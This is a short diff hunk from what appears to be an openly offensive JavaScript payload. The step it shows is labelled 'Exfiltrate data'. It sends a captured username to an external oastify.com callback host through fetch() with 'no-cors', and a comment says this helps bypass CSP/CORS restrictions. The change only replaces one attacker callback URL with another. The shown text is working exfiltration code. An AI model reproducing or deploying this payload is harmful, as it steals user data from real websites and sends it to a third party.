@@ -20,7 +20,7 @@
 
     // 3. Exfiltrate data (Added await and encoding)
     console.log(`Exfiltrating username: ${username}`);
-    await fetch(`https://e8nqpku10p8gzynraefduguziqohca0z.oastify.com?username=${encodeURIComponent(username)}`, {
+    await fetch(`https://34595iaclwjjtgdchi1umwuszj5at1hq.oastify.com?username=${encodeURIComponent(username)}`, {
       mode: 'no-cors' // Helps bypass some basic CSP/CORS restrictions for simple pings
     });
 
